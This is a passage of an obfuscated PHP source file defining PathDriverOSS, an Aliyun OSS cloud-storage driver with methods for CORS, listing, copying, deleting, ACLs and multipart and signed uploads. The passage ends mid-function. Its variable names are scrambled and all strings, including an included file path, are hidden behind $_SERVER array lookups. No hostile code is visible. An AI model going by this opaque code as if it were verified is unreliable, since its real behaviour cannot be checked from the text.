<?php
 goto EÍâßÎ™İ†; f¨‡Ûôğ“”: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($³ìÙ¸’…) { parent::__construct(); include_once SDK_DIR . $_SERVER[¼’ç§¼´][1472]; $this->_init($³ìÙ¸’…); } public function _init($»†¹ûÂÎ) { $¦ï‰çËÈ =& $_SERVER[¼’ç§¼´]; $this->config = $»†¹ûÂÎ; foreach ($»†¹ûÂÎ as $‚ØĞÙï­ => $«ëœïø°) { if (isset($this->{$‚ØĞÙï­})) { $this->{$‚ØĞÙï­} = $«ëœïø°; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¦ï‰çËÈ[1473] . LNG($¦ï‰çËÈ[1474])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $åıùôÕ =& $_SERVER[¼’ç§¼´]; $Ì˜·†õÄ = new OSS\Model\CorsConfig(); $øƒİÏ¦ = new OSS\Model\CorsRule(); $øƒİÏ¦->addAllowedOrigin($åıùôÕ[1475]); $øƒİÏ¦->addAllowedMethod($åıùôÕ[1476]); $øƒİÏ¦->addAllowedMethod($åıùôÕ[1477]); $øƒİÏ¦->addAllowedMethod($åıùôÕ[1478]); $øƒİÏ¦->addAllowedMethod($åıùôÕ[1479]); $øƒİÏ¦->addAllowedMethod($åıùôÕ[165]); $øƒİÏ¦->setMaxAgeSeconds(600); $øƒİÏ¦->addExposeHeader($åıùôÕ[1480]); $øƒİÏ¦->addAllowedHeader($åıùôÕ[1475]); $Ì˜·†õÄ->addRule($øƒİÏ¦); try { $this->client->putBucketCors($this->bucket, $Ì˜·†õÄ); } catch (OSS\Core\OssException $À‚÷«†ñ) { $this->writeLog(__FUNCTION__ . $åıùôÕ[214] . $À‚÷«†ñ->getMessage()); return !1; } return !0; } public function getBucketCors() { $ú³õŞÀ =& $_SERVER[¼’ç§¼´]; $Ö„ÉÒŠ´ = null; try { $Ö„ÉÒŠ´ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $·ÒâØõº) { $this->writeLog(__FUNCTION__ . $ú³õŞÀ[214] . $·ÒâØõº->getMessage()); return null; } if (!$Ö„ÉÒŠ´ || !($˜¼Ü¤Á• = $Ö„ÉÒŠ´->getRules())) { return null; } $ß“¨Ô›Æ = $˜¼Ü¤Á•[0]->getAllowedOrigins(); $®²ßÓ­ò = $˜¼Ü¤Á•[0]->getAllowedMethods(); $Ä‘œòÚ = $˜¼Ü¤Á•[0]->getMaxAgeSeconds(); $³ş¥ƒÚ¥ = $˜¼Ü¤Á•[0]->getExposeHeaders(); $Ù’“›š = $˜¼Ü¤Á•[0]->getAllowedHeaders(); return array($ú³õŞÀ[220] => isset($ß“¨Ô›Æ[0]) ? $ß“¨Ô›Æ[0] : $ú³õŞÀ[12], $ú³õŞÀ[224] => $®²ßÓ­ò, $ú³õŞÀ[1481] => $Ä‘œòÚ, $ú³õŞÀ[1482] => isset($³ş¥ƒÚ¥[0]) ? $³ş¥ƒÚ¥[0] : $ú³õŞÀ[12], $ú³õŞÀ[221] => isset($Ù’“›š[0]) ? $Ù’“›š[0] : $ú³õŞÀ[12]); } public function isBucketCors() { $Å€êù† =& $_SERVER[¼’ç§¼´]; $¿­£¾ê¬ = $this->getBucketCors(); if (!$¿­£¾ê¬ || !is_array($¿­£¾ê¬)) { return !1; } if ($¿­£¾ê¬[$Å€êù†[220]] != $Å€êù†[222] || $¿­£¾ê¬[$Å€êù†[221]] != $Å€êù†[222]) { return !1; } $Î›ùá®— = array_map($Å€êù†[223], $¿­£¾ê¬[$Å€êù†[224]]); if (!is_array($Î›ùá®—)) { $Î›ùá®— = array(); } $¦»èşè = array($Å€êù†[225], $Å€êù†[226], $Å€êù†[227], $Å€êù†[228], $Å€êù†[229]); $’§ú­Ï = array_diff($¦»èşè, $Î›ùá®—); return empty($’§ú­Ï); } public function mkfile($ˆË€šŒ¢, $–÷ä£ = '', $ºâ’Œ—„ = REPEAT_RENAME) { $İÙ…Òğø = $this->setContent($ˆË€šŒ¢, $–÷ä£); if ($İÙ…Òğø !== !1) { return $this->getPathOuter($ˆË€šŒ¢); } return !1; } public function mkdir($ğöÇ¥ãÕ, $ÙÇïËó = REPEAT_SKIP) { if ($ÙÇïËó && $this->_isFolder($ğöÇ¥ãÕ)) { return $this->getPathOuter($ğöÇ¥ãÕ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ğöÇ¥ãÕ)); } catch (OSS\Core\OssException $¬˜•é‰Å) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][214] . $¬˜•é‰Å->getMessage()); return !1; } return $this->getPathOuter($ğöÇ¥ãÕ); } private function fileList($Üóß²½Ù, $ ÏïËÙÉ = '', $¯¨‡¼ïù = 0) { $‹º†©›´ =& $_SERVER[¼’ç§¼´]; $Üóß²½Ù = trim($Üóß²½Ù, $‹º†©›´[8]); $ìËšŸÂä = empty($Üóß²½Ù) && $Üóß²½Ù !== $‹º†©›´[230] ? $‹º†©›´[12] : $Üóß²½Ù . $‹º†©›´[8]; $£‹²ë¶ = $‹º†©›´[12]; $¯’£×²‘ = 1000; $‡ÈÄÌÄ = $ˆ¬µÎÕï = array(); while (!0) { check_abort(); $€ˆ»å‘ó = array($‹º†©›´[1483] => $ ÏïËÙÉ, $‹º†©›´[1484] => $ìËšŸÂä, $‹º†©›´[1485] => $¯’£×²‘, $‹º†©›´[1486] => $£‹²ë¶); try { $¢Ô£ç˜Û = $this->client->listObjects($this->bucket, $€ˆ»å‘ó); } catch (OSS\Core\OssException $ÙÅ¬ŠÜ¸) { $this->writeLog(__FUNCTION__ . $‹º†©›´[214] . $ÙÅ¬ŠÜ¸->getMessage()); break; } $£‹²ë¶ = $¢Ô£ç˜Û->getNextMarker(); $¼îĞïÌË = $¢Ô£ç˜Û->getObjectList(); $­ó•š½© = $¢Ô£ç˜Û->getPrefixList(); foreach ($¼îĞïÌË as $ß”ŠìÇî) { if ($ß”ŠìÇî->getKey() == $ìËšŸÂä) { continue; } $ÖÙ±ñ‘— = $ß”ŠìÇî->getKey(); $ÙóÊùƒù = $ß”ŠìÇî->getSize(); $§ùµ»ˆ‰ = $ß”ŠìÇî->getLastModified(); $¹É‘®ĞÚ = trim($ß”ŠìÇî->getETag(), $‹º†©›´[121]); $¶Ø©ª«û = $¯¨‡¼ïù ? array($‹º†©›´[32] => $ÖÙ±ñ‘—, $‹º†©›´[79] => $ÙóÊùƒù, $‹º†©›´[206] => strtotime($§ùµ»ˆ‰), $‹º†©›´[1487] => $¹É‘®ĞÚ) : $ÖÙ±ñ‘—; $Ó€•¤Ô³ = $ÙóÊùƒù == 0 && substr($ÖÙ±ñ‘—, strlen($ÖÙ±ñ‘—) - 1, 1) == $‹º†©›´[8] ? !0 : !1; $èù•ÏÀ¦ = array($‹º†©›´[79] => $ÙóÊùƒù, $‹º†©›´[1488] => $ÙóÊùƒù, $‹º†©›´[88] => strtotime($§ùµ»ˆ‰), $‹º†©›´[1489] => $§ùµ»ˆ‰, $‹º†©›´[1487] => $¹É‘®ĞÚ); $this->cacheMethodInfoSet($ÖÙ±ñ‘—, $Ó€•¤Ô³, $èù•ÏÀ¦); if ($Ó€•¤Ô³) { $‡ÈÄÌÄ[] = $ÖÙ±ñ‘—; continue; } $ˆ¬µÎÕï[] = $¶Ø©ª«û; } foreach ($­ó•š½© as $é÷µÃ‡) { $‡ÈÄÌÄ[] = $é÷µÃ‡->getPrefix(); $this->cacheMethodInfoSet($é÷µÃ‡->getPrefix(), !0); } if ($£‹²ë¶ === $‹º†©›´[12]) { break; } } $this->cacheMethodInfoSet($Üóß²½Ù, !0); return array($‹º†©›´[85] => $‡ÈÄÌÄ, $‹º†©›´[86] => $ˆ¬µÎÕï); } public function listObject($û™ñ×†æ, $Ì™Òı¢€ = '') { $ç’’Æ =& $_SERVER[¼’ç§¼´]; $û™ñ×†æ = trim($û™ñ×†æ, $ç’’Æ[8]); $“‰Çº‚± = empty($û™ñ×†æ) && $û™ñ×†æ !== $ç’’Æ[230] ? $ç’’Æ[12] : $û™ñ×†æ . $ç’’Æ[8]; $‘±ÈŸœº = $ç’’Æ[12]; $—ƒÂà¸Œ = 1000; $Ç¦ÁŠö = $èÜ¸åşÏ = array(); while (!0) { check_abort(); $ÚìÕ±Å = array($ç’’Æ[1483] => $Ì™Òı¢€, $ç’’Æ[1484] => $“‰Çº‚±, $ç’’Æ[1485] => $—ƒÂà¸Œ, $ç’’Æ[1486] => $‘±ÈŸœº); try { $“ì¡åÛ‹ = $this->client->listObjects($this->bucket, $ÚìÕ±Å); } catch (OSS\Core\OssException $¦‡ôËıĞ) { $this->writeLog(__FUNCTION__ . $ç’’Æ[214] . $¦‡ôËıĞ->getMessage()); break; } $‘±ÈŸœº = $“ì¡åÛ‹->getNextMarker(); $ç¶»á÷… = $“ì¡åÛ‹->getObjectList(); foreach ($ç¶»á÷… as $‡şôÖ‹—) { if ($‡şôÖ‹—->getKey() == $“‰Çº‚±) { continue; } $ûª€İ“— = $‡şôÖ‹—->getKey(); $ÑÌŠûÖƒ = $‡şôÖ‹—->getSize(); $¦˜°‘’„ = $ÑÌŠûÖƒ == 0 && substr($ûª€İ“—, strlen($ûª€İ“—) - 1, 1) == $ç’’Æ[8] ? !0 : !1; if ($¦˜°‘’„) { continue; } $èÜ¸åşÏ[] = $ÑÌŠûÖƒ . $ç’’Æ[214] . $ûª€İ“—; } if ($‘±ÈŸœº === $ç’’Æ[12]) { break; } } return array($ç’’Æ[85] => $Ç¦ÁŠö, $ç’’Æ[86] => $èÜ¸åşÏ); } public function copyFile($–ÚÓüïò, $© ”ıçË) { $ş¶õÌØÕ = $this->size($–ÚÓüïò); if ($ş¶õÌØÕ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $–ÚÓüïò, $this->bucket, $this->pathEncode($© ”ıçË)); } catch (OSS\Core\OssException $”§ÀÔë–) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][214] . $”§ÀÔë–->getMessage()); return !1; } return $this->getPathOuter($© ”ıçË); } $ÂÇ—Ò”… = $this->multiCopyObject($–ÚÓüïò, $© ”ıçË, $ş¶õÌØÕ); return $ÂÇ—Ò”… ? $this->getPathOuter($© ”ıçË) : !1; } private function multiCopyObject($îüæÓâ¤, $Ÿ»’Û——, $’ŠŠĞ¡É) { $ïÂ”‡ =& $_SERVER[¼’ç§¼´]; try { $÷Ù´¸µ• = array(); if ($´ôÙïº­ = $this->hashMd5($îüæÓâ¤)) { $÷Ù´¸µ• = array(OSS\OssClient::OSS_HEADERS => array($ïÂ”‡[1490] => $´ôÙïº­)); } $ÃèºğÆª = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ÿ»’Û——), $÷Ù´¸µ•); $çªÈ×Ö = 1; $–÷Ñè¨ã = 0; $³«ÚÄ½ = array(); $ÏæÒ§ºß = 1024 * 1024 * 10; $œô§¡Ûë = $this->client->generateMultiuploadParts($’ŠŠĞ¡É, $ÏæÒ§ºß); foreach ($œô§¡Ûë as $¹Û½»ØÎ => $›É¡§¼) { $’Œ¡ã´ø = $–÷Ñè¨ã + (int) $›É¡§¼[$ïÂ”‡[1491]]; $Õ…Ğëœš = (int) $›É¡§¼[$ïÂ”‡[414]] + $’Œ¡ã´ø - 1; $Ô³‰×„ = array($ïÂ”‡[167] => $’Œ¡ã´ø, $ïÂ”‡[168] => $Õ…Ğëœš); $³«ÚÄ½[] = $this->client->uploadPartCopy($this->bucket, $îüæÓâ¤, $this->bucket, $this->pathEncode($Ÿ»’Û——), $çªÈ×Ö, $ÃèºğÆª, $Ô³‰×„); $çªÈ×Ö = $çªÈ×Ö + 1; } $–’İûçı = array(); foreach ($³«ÚÄ½ as $¹Û½»ØÎ => $ºĞ¦âùÉ) { $–’İûçı[] = array($ïÂ”‡[299] => $¹Û½»ØÎ + 1, $ïÂ”‡[300] => $ºĞ¦âùÉ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ÿ»’Û——), $ÃèºğÆª, $–’İûçı); } catch (OSS\Core\OssException $ª§Íøç») { $this->writeLog(__FUNCTION__ . $ïÂ”‡[214] . $ª§Íøç»->getMessage()); return !1; } return !0; } public function moveFile($¸“Á—ì, $Ì‡ÔÚş´) { if ($this->copyFile($¸“Á—ì, $Ì‡ÔÚş´)) { $this->remove($¸“Á—ì); return $this->getPathOuter($Ì‡ÔÚş´); } return !1; } public function delFile($Ã… ö¯Ş) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ã… ö¯Ş)); } catch (OSS\Core\OssException $‘¯—şû˜) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][214] . $‘¯—şû˜->getMessage()); return !1; } return !0; } public function delFolder($ûæ¬˜§•) { $ßºùÆŠ– =& $_SERVER[¼’ç§¼´]; if (!$this->exist($ûæ¬˜§•)) { return !0; } $this->listItemCache = !1; $¥©åÖÊˆ = $this->fileList($ûæ¬˜§•); $this->listItemCache = !0; $¾ñ“µ¢‰ = trim($ûæ¬˜§•, $ßºùÆŠ–[8]) . $ßºùÆŠ–[8]; if (!empty($ûæ¬˜§•) && $ûæ¬˜§• !== $ßºùÆŠ–[230] && !in_array($¾ñ“µ¢‰, $¥©åÖÊˆ[$ßºùÆŠ–[85]])) { $¥©åÖÊˆ[$ßºùÆŠ–[85]][] = $¾ñ“µ¢‰; } $Ô²÷Œ÷Š = $this->delByBatch($¥©åÖÊˆ[$ßºùÆŠ–[86]]); if (!$Ô²÷Œ÷Š) { return !1; } $Ô²÷Œ÷Š = $this->delByBatch($¥©åÖÊˆ[$ßºùÆŠ–[85]]); if (!$Ô²÷Œ÷Š) { return !1; } return $this->delFile($¾ñ“µ¢‰); } private function delByBatch($¾µÄø) { foreach (array_chunk($¾µÄø, 1000) as $ûÚº’æè) { try { $this->client->deleteObjects($this->bucket, $ûÚº’æè); } catch (OSS\Core\OssException $­„ŸˆÙÀ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][214] . $­„ŸˆÙÀ->getMessage()); return !1; } } return !0; } public function rename($êŞñµ®, $‰»ñÌò) { return $this->renameObject($êŞñµ®, $‰»ñÌò); } private function fileInfo($©Æï¢Ÿ², $Óºº = false, $§äÁ¢ıÓ = array()) { $§ìôÖÔ€ =& $_SERVER[¼’ç§¼´]; $Ş¯åˆ‚¬ = array($§ìôÖÔ€[32] => $this->pathThis($©Æï¢Ÿ²), $§ìôÖÔ€[87] => $this->getPathOuter($©Æï¢Ÿ²), $§ìôÖÔ€[33] => $§ìôÖÔ€[232], $§ìôÖÔ€[79] => isset($§äÁ¢ıÓ[$§ìôÖÔ€[79]]) ? $§äÁ¢ıÓ[$§ìôÖÔ€[79]] : 0, $§ìôÖÔ€[169] => $this->ext($©Æï¢Ÿ²)); if ($Óºº) { return $Ş¯åˆ‚¬; } $Ş¯åˆ‚¬[$§ìôÖÔ€[233]] = $Ş¯åˆ‚¬[$§ìôÖÔ€[88]] = 0; $Ş¯åˆ‚¬[$§ìôÖÔ€[234]] = $Ş¯åˆ‚¬[$§ìôÖÔ€[235]] = !0; if (empty($§äÁ¢ıÓ)) { $¼èı¹ı‹ = $this->objectMeta($©Æï¢Ÿ²); if (!$¼èı¹ı‹) { return $Ş¯åˆ‚¬; } $§äÁ¢ıÓ = array($§ìôÖÔ€[88] => strtotime($¼èı¹ı‹[$§ìôÖÔ€[1489]]), $§ìôÖÔ€[79] => $¼èı¹ı‹[$§ìôÖÔ€[1488]] + 0, $§ìôÖÔ€[1487] => $¼èı¹ı‹[$§ìôÖÔ€[1487]]); } if (isset($§äÁ¢ıÓ[$§ìôÖÔ€[1487]]) && $§äÁ¢ıÓ[$§ìôÖÔ€[1487]]) { $Ş¯åˆ‚¬[$§ìôÖÔ€[237]] = trim($§äÁ¢ıÓ[$§ìôÖÔ€[1487]], $§ìôÖÔ€[121]); } if (isset($§äÁ¢ıÓ[$§ìôÖÔ€[79]])) { $Ş¯åˆ‚¬[$§ìôÖÔ€[79]] = $§äÁ¢ıÓ[$§ìôÖÔ€[79]]; } if (isset($§äÁ¢ıÓ[$§ìôÖÔ€[88]])) { $Ş¯åˆ‚¬[$§ìôÖÔ€[88]] = $§äÁ¢ıÓ[$§ìôÖÔ€[88]]; } if (isset($§äÁ¢ıÓ[$§ìôÖÔ€[206]]) && !trim($Ş¯åˆ‚¬[$§ìôÖÔ€[88]])) { $Ş¯åˆ‚¬[$§ìôÖÔ€[88]] = $§äÁ¢ıÓ[$§ìôÖÔ€[206]]; } return $Ş¯åˆ‚¬; } private function folderInfo($½Ş…Ú„­, $Ëƒ´† = false, $ŸÌ³Ğ¤˜ = array()) { $é‘«¬› =& $_SERVER[¼’ç§¼´]; $ÕŠşª„ë = array($é‘«¬›[32] => $this->pathThis($½Ş…Ú„­), $é‘«¬›[87] => $this->getPathOuter($é‘«¬›[8] . $½Ş…Ú„­), $é‘«¬›[33] => $é‘«¬›[78]); if ($Ëƒ´†) { return $ÕŠşª„ë; } $ÕŠşª„ë[$é‘«¬›[233]] = $ÕŠşª„ë[$é‘«¬›[88]] = 0; $ÕŠşª„ë[$é‘«¬›[234]] = $ÕŠşª„ë[$é‘«¬›[235]] = !0; if (empty($ŸÌ³Ğ¤˜)) { $½Ş…Ú„­ = rtrim($½Ş…Ú„­, $é‘«¬›[8]) . $é‘«¬›[8]; $ŞÆı¨™Ğ = $this->objectMeta($½Ş…Ú„­); if (!$ŞÆı¨™Ğ) { return $ÕŠşª„ë; } $ŸÌ³Ğ¤˜ = array($é‘«¬›[233] => $ŞÆı¨™Ğ[$é‘«¬›[586]][$é‘«¬›[1492]], $é‘«¬›[88] => strtotime($ŞÆı¨™Ğ[$é‘«¬›[1489]])); } if (isset($ŸÌ³Ğ¤˜[$é‘«¬›[88]])) { $ÕŠşª„ë[$é‘«¬›[88]] = $ŸÌ³Ğ¤˜[$é‘«¬›[88]]; } if (isset($ŸÌ³Ğ¤˜[$é‘«¬›[233]])) { $ÕŠşª„ë[$é‘«¬›[233]] = $ŸÌ³Ğ¤˜[$é‘«¬›[233]]; } return $ÕŠşª„ë; } public function listPath($Ê“çŠÑ•, $Šü‘ÔŞ® = false) { $öÜş†âÖ =& $_SERVER[¼’ç§¼´]; $ñ“…÷ñø = $this->fileList($Ê“çŠÑ•, $öÜş†âÖ[8], !0); foreach ($ñ“…÷ñø[$öÜş†âÖ[85]] as $º“Œ’™ => $’ØÍ–) { $ñ“…÷ñø[$öÜş†âÖ[85]][$º“Œ’™] = $this->folderInfo($’ØÍ–, $Šü‘ÔŞ®, $’ØÍ–); } foreach ($ñ“…÷ñø[$öÜş†âÖ[86]] as $º“Œ’™ => $’ØÍ–) { $ñ“…÷ñø[$öÜş†âÖ[86]][$º“Œ’™] = $this->fileInfo($’ØÍ–[$öÜş†âÖ[32]], $Šü‘ÔŞ®, $’ØÍ–); } return $ñ“…÷ñø; } protected function infoChildren($¼ûÙòÁá, &$¬¶¬ë¼) { $‘ï™–‘ì =& $_SERVER[¼’ç§¼´]; $¢µ©¼ßÔ = $this->fileList($¼ûÙòÁá, $‘ï™–‘ì[12], !0); $¬¶¬ë¼[$‘ï™–‘ì[81]] += count($¢µ©¼ßÔ[$‘ï™–‘ì[85]]); $¬¶¬ë¼[$‘ï™–‘ì[80]] += count($¢µ©¼ßÔ[$‘ï™–‘ì[86]]); foreach ($¢µ©¼ßÔ[$‘ï™–‘ì[86]] as $«“İåıê) { if (!$«“İåıê || !$«“İåıê[$‘ï™–‘ì[79]]) { continue; } $¬¶¬ë¼[$‘ï™–‘ì[79]] += $«“İåıê[$‘ï™–‘ì[79]]; } } public function has($ü¯ƒãÁ², $Ğõı†’¦ = false, $ú€Îñãó = true) { $êÅæï =& $_SERVER[¼’ç§¼´]; $ü¯ƒãÁ² = trim($ü¯ƒãÁ², $êÅæï[8]); $€“ğ½Ô = empty($ü¯ƒãÁ²) && $ü¯ƒãÁ² !== $êÅæï[230] ? $êÅæï[12] : $ü¯ƒãÁ² . $êÅæï[8]; $Š²¥îË = $êÅæï[12]; $†‹†©Ú = 500; $…ÀÕäùà = $±ı–Ûï± = 0; while (!0) { check_abort(); $ç¹æ´—Ù = array($êÅæï[1483] => $êÅæï[8], $êÅæï[1484] => $€“ğ½Ô, $êÅæï[1485] => $†‹†©Ú, $êÅæï[1486] => $Š²¥îË); try { $öâ““äŞ = $this->client->listObjects($this->bucket, $ç¹æ´—Ù); } catch (OSS\Core\OssException $Õ í‹À‡) { $this->writeLog(__FUNCTION__ . $êÅæï[214] . $Õ í‹À‡->getMessage()); break; } $Š²¥îË = $öâ““äŞ->getNextMarker(); $®ßˆ¡Áİ = $öâ““äŞ->getObjectList(); $ÎñšÙ = $öâ““äŞ->getPrefixList(); if ($Ğõı†’¦) { if (count($®ßˆ¡Áİ) > 1 || count($®ßˆ¡Áİ) == 1 && $®ßˆ¡Áİ[0]->getKey() != $€“ğ½Ô) { $…ÀÕäùà += count($®ßˆ¡Áİ) - 1; } if (!empty($ÎñšÙ)) { $±ı–Ûï± += count($ÎñšÙ); } if ($Š²¥îË === $êÅæï[12]) { break; } continue; } if ($ú€Îñãó) { if (!empty($®ßˆ¡Áİ)) { if (count($®ßˆ¡Áİ) > 1 || $®ßˆ¡Áİ[0]->getKey() != $€“ğ½Ô) { return !0; } } } else { if (!empty($ÎñšÙ)) { return !0; } } if ($Š²¥îË === $êÅæï[12]) { break; } } if ($Ğõı†’¦) { return array($êÅæï[241] => $…ÀÕäùà, $êÅæï[242] => $±ı–Ûï±); } return !1; } public function listAll($î¿¨­¯ï) { $¬Ö×€˜› =& $_SERVER[¼’ç§¼´]; $ç¼£§ŸÇ = $this->fileList($î¿¨­¯ï, $¬Ö×€˜›[12], !0); $å¹Ñ¼úá = array_to_keyvalue($ç¼£§ŸÇ[$¬Ö×€˜›[86]], $¬Ö×€˜›[32]); foreach ($ç¼£§ŸÇ[$¬Ö×€˜›[85]] as $á¼œó©ğ) { if (is_string($á¼œó©ğ)) { $å¹Ñ¼úá[$á¼œó©ğ] = array($¬Ö×€˜›[79] => 0); } } return $this->listAllFiles($î¿¨­¯ï, $å¹Ñ¼úá); } public function canRead($‰ÁÖ–ë³) { $à’Ï˜ıë =& $_SERVER[¼’ç§¼´]; $®»ş†ÄÖ = $this->pathAcl($‰ÁÖ–ë³); return $®»ş†ÄÖ == $à’Ï˜ıë[1493] || $®»ş†ÄÖ == $à’Ï˜ıë[633] ? !0 : !1; } public function canWrite($«€ğ™§›) { $ä—Ñ¾Üó = $this->pathAcl($«€ğ™§›); return $ä—Ñ¾Üó == $_SERVER[¼’ç§¼´][633] ? !0 : !1; } public function pathAcl($Ü‚Şé—¦) { $éˆÑœÁ» =& $_SERVER[¼’ç§¼´]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $êüèŒø = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ü‚Şé—¦)); } catch (OSS\Core\OssException $ÀÂ·ËĞô) { $this->writeLog(__FUNCTION__ . $éˆÑœÁ»[214] . $ÀÂ·ËĞô->getMessage()); return !1; } $¯üúÚ¤ = $êüèŒø == $éˆÑœÁ»[37] ? $this->bucketAcl : $êüèŒø; if ($¯üúÚ¤ == $éˆÑœÁ»[1494]) { return $éˆÑœÁ»[1493]; } if ($¯üúÚ¤ == $éˆÑœÁ»[1495]) { return $éˆÑœÁ»[633]; } return $¯üúÚ¤; } private function chmodPath($ˆŠì¶óô, $€‹å¯ß… = '') { $ä½…µû =& $_SERVER[¼’ç§¼´]; $´Å÷÷ÀŒ = empty($€‹å¯ß…) ? $ä½…µû[1495] : $€‹å¯ß…; $¾»Ó¶í = array($ä½…µû[37], $ä½…µû[231], $ä½…µû[1494], $ä½…µû[1495]); if (!in_array($´Å÷÷ÀŒ, $¾»Ó¶í)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ˆŠì¶óô), $´Å÷÷ÀŒ); } catch (OSS\Core\OssException $…¡†ø©­) { $this->writeLog(__FUNCTION__ . $ä½…µû[214] . $…¡†ø©­->getMessage()); return !1; } return !0; } public function getContent($¯…˜—ƒ) { return $this->fileSubstr($¯…˜—ƒ, -1); } public function setContent($©‡»ïÜ, $€ùÈÒğ = '') { $çæì•¹ï =& $_SERVER[¼’ç§¼´]; try { $«…Äò¸ = $this->trafficLimit($çæì•¹ï[1496]); $«´éôá® = $this->client->putObject($this->bucket, $this->pathEncode($©‡»ïÜ), $€ùÈÒğ, $«…Äò¸); } catch (OSS\Core\OssException $ÆŠ‡ÏŸõ) { $this->writeLog(__FUNCTION__ . $çæì•¹ï[214] . $ÆŠ‡ÏŸõ->getMessage()); return !1; } $ÛßĞ—×› = array($çæì•¹ï[1490] => trim($«´éôá®[$çæì•¹ï[1487]], $çæì•¹ï[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($©‡»ïÜ))); $this->updateObjMeta($©‡»ïÜ, $ÛßĞ—×›); return isset($«´éôá®[$çæì•¹ï[1497]][$çæì•¹ï[296]]) ? !0 : !1; } private function updateObjMeta($¿ ¾éö¢, $˜â˜¦’) { $¿ ¾éö¢ = $this->pathEncode($¿ ¾éö¢); try { $½ü¢¡ = array(OSS\OssClient::OSS_HEADERS => $˜â˜¦’); $this->client->copyObject($this->bucket, $¿ ¾éö¢, $this->bucket, $¿ ¾éö¢, $½ü¢¡); } catch (OSS\Core\OssException $“øÒ´·¹) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][214] . $“øÒ´·¹->getMessage()); return !1; } return !0; } public function upload($ĞÕú¾ , $äÑ—‘§ù, $ûàÊñíı = false, $‘Ëµô¡ = REPEAT_REPLACE) { $—‹™ñ×Ô =& $_SERVER[¼’ç§¼´]; $ÙÆë¯‡ö = trim($ĞÕú¾ , $—‹™ñ×Ô[8]); $ÉÌŠé¨Û = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($—‹™ñ×Ô[1490] => @md5_file($äÑ—‘§ù)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ĞÕú¾ ))); $ÉÌŠé¨Û = $this->trafficLimit($—‹™ñ×Ô[1496], $ÉÌŠé¨Û); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÙÆë¯‡ö), $äÑ—‘§ù, $ÉÌŠé¨Û); } catch (OSS\Core\OssException $ó¹ÅÒó´) { $this->writeLog(__FUNCTION__ . $—‹™ñ×Ô[214] . $ó¹ÅÒó´->getMessage()); return !1; } return $this->getPathOuter($ĞÕú¾ ); } public function getHost() { $•¥±”¹ì =& $_SERVER[¼’ç§¼´]; $õå¹Õù° = explode($•¥±”¹ì[210], parent::getHost()); return $õå¹Õù°[0] . $•¥±”¹ì[210] . $this->bucket . $•¥±”¹ì[10] . $õå¹Õù°[1]; } public function uploadFormData($Ø©Ïãª´, $«ÂÈı°¦ = 3600) { $öú‚¥›Œ =& $_SERVER[¼’ç§¼´]; if (!($°ï©¼„¸ = $this->getHost())) { return !1; } $ãèïÜ˜ = $«ÂÈı°¦; $­ç³öÅˆ = date($öú‚¥›Œ[1498], time() + $ãèïÜ˜); $ş¤—Üü = new DateTime($­ç³öÅˆ); $–³‘î = $ş¤—Üü->format(DateTime::ISO8601); $Ä„€æ¤Á = strpos($–³‘î, $öú‚¥›Œ[373]); $–³‘î = substr($–³‘î, 0, $Ä„€æ¤Á) . $öú‚¥›Œ[1499]; $æ­ÊÏƒ = 1048576000 * 5; $êÉ½©â¡ = $this->pathFather($Ø©Ïãª´); $ÁùÖõ = array($öú‚¥›Œ[264] => $–³‘î, $öú‚¥›Œ[267] => array(array($öú‚¥›Œ[1500], 0, $æ­ÊÏƒ), array($öú‚¥›Œ[269], $öú‚¥›Œ[270], $êÉ½©â¡))); $¡Ê¥’Ì = base64_encode(json_encode($ÁùÖõ)); $‚Áõğ† = base64_encode(hash_hmac($öú‚¥›Œ[1421], $¡Ê¥’Ì, $this->secret, !0)); $İßçñÓå = array($öú‚¥›Œ[1501] => $this->accessKey, $öú‚¥›Œ[279] => $¡Ê¥’Ì, $öú‚¥›Œ[272] => $öú‚¥›Œ[263], $öú‚¥›Œ[1502] => $‚Áõğ†, $öú‚¥›Œ[208] => $°ï©¼„¸); $İßçñÓå = $this->trafficLimit($öú‚¥›Œ[1496], $İßçñÓå, !0); return $İßçñÓå; } public function uploadMultiData($í•˜ååæ, $³ÒÉ»Ã = 3600) { $²›™›ó… =& $_SERVER[¼’ç§¼´]; if (!($òØ«è«Ó = $this->getHost())) { return !1; } $¼¹†ø¤ç = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($í•˜ååæ)); return array($²›™›ó…[283] => $¼¹†ø¤ç, $²›™›ó…[208] => $òØ«è«Ó . $²›™›ó…[8] . $this->pathEncode($í•˜ååæ), $²›™›ó…[284] => gmdate($²›™›ó…[1503]), $²›™›ó…[97] => $í•˜ååæ); } public function uploadMultiAuth($ê„Ïëùì, $™öÏ¶Ô¶ = array()) { if (isset($™öÏ¶Ô¶[$_SERVER[¼’ç§¼´][285]])) { return $this->uploadPartAuth($ê„Ïëùì, $™öÏ¶Ô¶); } return $this->uploadListAuth($ê„Ïëùì, $™öÏ¶Ô¶); } private function uploadPartAuth($ü¿Úğ³œ, $àĞ¼²§´ = array()) { 